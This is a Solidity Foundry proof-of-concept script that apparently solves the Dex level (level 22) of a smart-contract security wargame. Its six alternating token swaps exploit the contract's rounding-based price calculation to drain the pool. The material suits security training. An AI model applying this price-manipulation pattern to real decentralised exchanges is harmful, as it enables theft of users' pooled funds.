// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "src/level22.sol";

contract POC is Script {
    Dex level22;
    SwappableToken tokenA;
    SwappableToken tokenB;

    function setUp() public {
        // Defining contracts
        level22 = Dex(0x7Ee3ee6628f96DDCd0206100ab046519E32510b4);
    }

    function run() public {
        vm.startBroadcast();

        tokenA = SwappableToken(level22.token1());
        tokenB = SwappableToken(level22.token2());

        level22.approve(address(level22), 200);
        level22.swap(address(tokenA), address(tokenB), 10);
        level22.swap(address(tokenB), address(tokenA), 20);
        level22.swap(address(tokenA), address(tokenB), 24);
        level22.swap(address(tokenB), address(tokenA), 30);
        level22.swap(address(tokenA), address(tokenB), 41);
        level22.swap(address(tokenB), address(tokenA), 45);

        tokenA.balanceOf(address(level22));
        tokenB.balanceOf(address(level22));

        vm.stopBroadcast();
    }
}
